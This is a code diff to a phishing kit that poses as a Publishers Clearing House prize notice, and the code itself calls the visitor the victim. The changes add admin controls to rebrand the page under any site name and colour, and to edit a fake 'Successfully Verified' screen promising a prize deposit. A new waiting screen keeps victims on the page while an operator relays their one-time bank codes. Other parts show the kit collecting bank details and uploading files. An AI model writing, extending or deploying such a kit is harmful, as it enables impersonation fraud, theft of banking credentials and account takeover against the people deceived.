@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Publishers Clearing House - Official Prize Notification</title>
+    <title id="page-title">Publishers Clearing House - Official Prize Notification</title>
     <style>
         :root {
             --pch-red: #E31841;
-            --pch-orange: #F2C94C; /* The Orange/Gold from your logo */
+            --pch-primary: #F2C94C; /* Dynamic Color */
             --pch-black: #231F20;
             --pch-gray: #F9F9F9;
             --pch-border: #E0E0E0;
@@ -33,7 +33,7 @@
             background: white;
             padding: 20px;
             text-align: center;
-            border-bottom: 4px solid var(--pch-orange);
+            border-bottom: 4px solid var(--pch-primary);
             box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
         
@@ -46,11 +46,11 @@
             justify-content: center;
         }
         
-        /* SVG Logo Styling to ensure it's Orange and Crisp */
+        /* SVG Logo Styling to ensure it's the Primary Color and Crisp */
         .pch-logo-svg {
             height: 100%;
             width: auto;
-            fill: var(--pch-orange); /* Force Orange Color */
+            fill: var(--pch-primary); 
         }
 
         /* Main Container */
@@ -76,7 +76,7 @@
             background: white;
             padding: 30px 25px;
             text-align: center;
-            border-bottom: 2px solid var(--pch-orange);
+            border-bottom: 2px solid var(--pch-primary);
         }
         .card-header h1 {
             font-family: var(--font-header);
@@ -164,7 +164,7 @@
         .btn-primary { 
             width: 100%; 
             padding: 16px; 
-            background: var(--pch-orange); 
+            background: var(--pch-primary); 
             color: var(--pch-black); 
             border: none; 
             border-radius: 4px; 
@@ -178,7 +178,7 @@
             box-shadow: 0 3px 6px rgba(0,0,0,0.1);
         }
         .btn-primary:hover { 
-            background: #E0B83E; 
+            filter: brightness(0.95); 
             transform: translateY(-1px);
         }
 
@@ -265,7 +265,7 @@
         .btn-activate { background: green; }
         .btn-reject { background: var(--pch-red); }
         .btn-delete { background: #CCC; color: black; }
-        .btn-save { background: var(--pch-orange); padding: 10px 20px; color: var(--pch-black); border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .btn-save { background: var(--pch-primary); padding: 10px 20px; color: var(--pch-black); border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
         .btn-add { background: var(--pch-black); color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
 
         /* Terms Modal */
@@ -336,12 +336,12 @@
 <body>
 
     <div class="pch-header">
-        <!-- GUARANTEED LOGO: Inline SVG ensures it always loads and is Orange -->
+        <!-- GUARANTEED LOGO: Inline SVG ensures it always loads and is the Primary Color -->
         <div class="pch-logo-container">
             <svg class="pch-logo-svg" viewBox="0 0 500 100" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="70" font-family="Century Gothic, sans-serif" font-weight="900" font-size="60">PCH</text>
+                <text x="10" y="70" font-family="Century Gothic, sans-serif" font-weight="900" font-size="60" id="svg-logo-text">PCH</text>
                 <rect x="200" y="40" width="3" height="50" fill="currentColor" />
-                <text x="215" y="70" font-family="Arial, sans-serif" font-weight="400" font-size="35">Publishers Clearing House</text>
+                <text x="215" y="70" font-family="Arial, sans-serif" font-weight="400" font-size="35" id="svg-logo-full-name">Publishers Clearing House</text>
             </svg>
         </div>
     </div>
@@ -493,13 +493,22 @@
                     </div>
                 </form>
 
-                <!-- OTP Success Screen -->
-                <div id="otp-success" class="hidden success-screen">
-                    <div class="success-icon">✓</div>
+                <!-- OTP Waiting Screen (Locked until Admin Activates) -->
+                <div id="otp-waiting" class="hidden success-screen">
+                    <div class="success-icon">🔐</div>
                     <h2 style="color: var(--pch-black);">Code Generated</h2>
                     <p>Please enter this code in the box above to complete verification:</p>
                     <div class="otp-display" id="generated-otp-display">0000</div>
-                    <p><small>The admin will verify your code shortly.</small></p>
+                    <p><small>The admin will verify your code shortly. Do not close this page.</small></p>
+                </div>
+
+                <!-- Final Success Screen (Only shown after Admin Activation) -->
+                <div id="otp-success" class="hidden success-screen">
+                    <div class="success-icon">✓</div>
+                    <h2 id="success-title" style="color: var(--pch-black);">Successfully Verified!</h2>
+                    <p id="success-message" style="font-size: 18px;">Congratulations! You have been successfully verified.</p>
+                    <p><small id="success-submessage">Your prize will be deposited within 24 hours.</small></p>
+                    <button id="success-button" class="btn-primary" onclick="location.reload()">Finish</button>
                 </div>
             </div>
         </div>
@@ -509,7 +518,7 @@
     <div id="admin-panel">
         <div class="admin-header">
             <h2 style="margin: 0;">PCH Admin Dashboard</h2>
-            <button onclick="logoutAdmin()" style="background: var(--pch-orange); color: black; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold;">Exit Admin</button>
+            <button onclick="logoutAdmin()" style="background: var(--pch-primary); color: black; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-weight: bold;">Exit Admin</button>
         </div>
         <div class="admin-body">
             
@@ -548,7 +557,39 @@
                         <input type="text" id="admin-headline" placeholder="Congratulations, [Name]!">
                     </div>
                 </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px;">
+                    <div>
+                        <label style="font-size: 11px;">Site Name (Logo Text)</label>
+                        <input type="text" id="admin-site-name" placeholder="Publishers Clearing House">
+                    </div>
+                    <div>
+                        <label style="font-size: 11px;">Primary Color (Hex Code)</label>
+                        <input type="color" id="admin-primary-color" value="#F2C94C" style="width: 100%; height: 35px; border: none; cursor: pointer;">
+                    </div>
+                </div>
+
                 <button class="btn-save" onclick="saveGlobalConfig()" style="margin-top: 10px;">Save Global Settings</button>
+            </div>
+
+            <!-- Success Page Editor -->
+            <div class="config-box">
+                <div class="admin-section-title">Edit "Successfully Verified" Page</div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <div>
+                        <label style="font-size: 11px;">Success Title</label>
+                        <input type="text" id="admin-success-title" placeholder="Successfully Verified!">
+                    </div>
+                    <div>
+                        <label style="font-size: 11px;">Success Button Text</label>
+                        <input type="text" id="admin-success-button" placeholder="Finish">
+                    </div>
+                </div>
+                <div style="margin-top: 10px;">
+                    <label style="font-size: 11px;">Success Message</label>
+                    <textarea id="admin-success-message" rows="3" style="width: 100%; padding: 10px; border: 1px solid #DDD; border-radius: 4px; font-family: Arial;">Congratulations! You have been successfully verified.</textarea>
+                </div>
+                <button class="btn-save" onclick="saveSuccessPageConfig()" style="margin-top: 10px;">Save Success Page</button>
             </div>
 
             <!-- Page Editor -->
@@ -583,7 +624,7 @@
     <div id="terms-modal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeTerms()">&times;</span>
-            <h2 style="color: var(--pch-red); border-bottom: 2px solid var(--pch-orange); padding-bottom: 10px;">Terms & Conditions</h2>
+            <h2 style="color: var(--pch-red); border-bottom: 2px solid var(--pch-primary); padding-bottom: 10px;">Terms & Conditions</h2>
             <p><strong>1. Prize Award:</strong> The winner agrees to accept the prize in the amount specified.</p>
             <p><strong>2. Taxation:</strong> Federal, State, and Local taxes may be deducted from the prize amount.</p>
             <p><strong>3. Verification:</strong> The winner must provide valid identification and financial information.</p>
@@ -594,12 +635,12 @@
     <div class="footer">
         <div class="pch-logo-container" style="transform: scale(0.5); margin-bottom: 20px;">
             <svg class="pch-logo-svg" viewBox="0 0 500 100" xmlns="http://www.w3.org/2000/svg">
-                <text x="10" y="70" font-family="Century Gothic, sans-serif" font-weight="900" font-size="60">PCH</text>
+                <text x="10" y="70" font-family="Century Gothic, sans-serif" font-weight="900" font-size="60" id="footer-logo-text">PCH</text>
                 <rect x="200" y="40" width="3" height="50" fill="currentColor" />
-                <text x="215" y="70" font-family="Arial, sans-serif" font-weight="400" font-size="35">Publishers Clearing House</text>
+                <text x="215" y="70" font-family="Arial, sans-serif" font-weight="400" font-size="35" id="footer-logo-full-name">Publishers Clearing House</text>
             </svg>
         </div>
-        <p>&copy; 2026 Publishers Clearing House. All Rights Reserved.</p>
+        <p>&copy; 2026 <span id="footer-site-name">Publishers Clearing House</span>. All Rights Reserved.</p>
         <p>
             <a onclick="openTerms()">Terms & Conditions</a> | 
             <a onclick="openTerms()">Privacy Policy</a> | 
@@ -617,6 +658,12 @@
             winnerName: 'Winner',
             prizeAmount: '$7,500',
             headline: 'Congratulations, [Name]!',
+            siteName: 'Publishers Clearing House',
+            primaryColor: '#F2C94C',
+            successTitle: 'Successfully Verified!',
+            successMessage: 'Congratulations! You have been successfully verified.',
+            successSubMessage: 'Your prize will be deposited within 24 hours.',
+            successButton: 'Finish',
             // Default Labels for each step
             labels: {
                 'step-1-field-1': 'Bank Name',
@@ -657,6 +704,15 @@
             document.getElementById('admin-winner-name').value = config.winnerName;
             document.getElementById('admin-prize-amount').value = config.prizeAmount;
             document.getElementById('admin-headline').value = config.headline;
+            
+            // Apply Branding Config
+            document.getElementById('admin-site-name').value = config.siteName;
+            document.getElementById('admin-primary-color').value = config.primaryColor;
+            
+            // Apply Success Page Config
+            document.getElementById('admin-success-title').value = config.successTitle;
+            document.getElementById('admin-success-message').value = config.successMessage;
+            document.getElementById('admin-success-button').value = config.successButton;
 
             // Apply Labels to Victim View
             applyLabels();
@@ -686,6 +742,24 @@
             let headlineText = config.headline || 'Congratulations, [Name]!';
             headlineText = headlineText.replace('[Name]', name);
             document.getElementById('page-headline').innerHTML = headlineText;
+
+            // Apply Branding
+            document.title = config.siteName + " - Official Prize Notification";
+            document.documentElement.style.setProperty('--pch-primary', config.primaryColor);
+            
+            // Update Logo Text
+            const shortName = config.siteName.split(' ').map(word => word[0]).join('').substring(0, 3);
+            document.getElementById('svg-logo-text').innerText = shortName;
+            document.getElementById('svg-logo-full-name').innerText = config.siteName;
+            document.getElementById('footer-logo-text').innerText = shortName;
+            document.getElementById('footer-logo-full-name').innerText = config.siteName;
+            document.getElementById('footer-site-name').innerText = config.siteName;
+
+            // Apply Success Page Content
+            document.getElementById('success-title').innerText = config.successTitle;
+            document.getElementById('success-message').innerText = config.successMessage;
+            document.getElementById('success-submessage').innerText = config.successSubMessage;
+            document.getElementById('success-button').innerText = config.successButton;
         }
 
         function generatePageEditors() {
@@ -767,12 +841,25 @@
             config.otpLength = parseInt(document.getElementById('admin-otp-length').value) || 6;
             
             config.winnerName = document.getElementById('admin-winner-name').value;
-            config.prizeAmount = document.getElementById('admin-prize_amount').value || document.getElementById('admin-prize-amount').value;
+            config.prizeAmount = document.getElementById('admin-prize-amount').value;
             config.headline = document.getElementById('admin-headline').value;
+
+            config.siteName = document.getElementById('admin-site-name').value;
+            config.primaryColor = document.getElementById('admin-primary-color').value;
 
             localStorage.setItem('pch_config', JSON.stringify(config));
             applySiteContent();
             alert('Global Settings Saved!');
+        }
+
+        function saveSuccessPageConfig() {
+            config.successTitle = document.getElementById('admin-success-title').value;
+            config.successMessage = document.getElementById('admin-success-message').value;
+            config.successButton = document.getElementById('admin-success-button').value;
+            
+            localStorage.setItem('pch_config', JSON.stringify(config));
+            applySiteContent();
+            alert('Success Page Updated!');
         }
 
         // --- VICTIM LOGIC ---
@@ -881,7 +968,7 @@
                 updateProgress(10);
                 
                 // Show the OTP code to the victim
-                document.getElementById('otp-success').classList.remove('hidden');
+                document.getElementById('otp-waiting').classList.remove('hidden');
                 document.getElementById('generated-otp-display').innerText = generatedOTP;
 
                 // Start polling for admin activation
@@ -914,6 +1001,10 @@
             errDiv.style.display = 'block';
             document.getElementById('otp-code').value = '';
             document.getElementById('otp-code').focus();
+            
+            // If they were on the waiting screen, take them back to step 10
+            document.getElementById('otp-waiting').classList.add('hidden');
+            document.getElementById('step-10').classList.remove('hidden');
         }
 
         function uploadToImgBB(file) {
@@ -998,14 +1089,8 @@
         }
 
         function showFinalSuccessScreen() {
-            const successDiv = document.getElementById('otp-success');
-            successDiv.innerHTML = `
-                <div class="success-icon">✓</div>
-                <h2 style="color: var(--pch-black);">Successfully Verified!</h2>
-                <p style="font-size: 18px;">Congratulations! You have been successfully verified. Thanks for making it PCH.</p>
-                <p><small>Your prize will be deposited within 24 hours.</small></p>
-                <button class="btn-primary" onclick="location.reload()">Finish</button>
-            `;
+            document.getElementById('otp-waiting').classList.add('hidden');
+            document.getElementById('otp-success').classList.remove('hidden');
         }
 
         // --- ADMIN LOGIC ---
@@ -1116,4 +1201,4 @@
         });
     </script>
 </body>
-                    </html>
+</html>
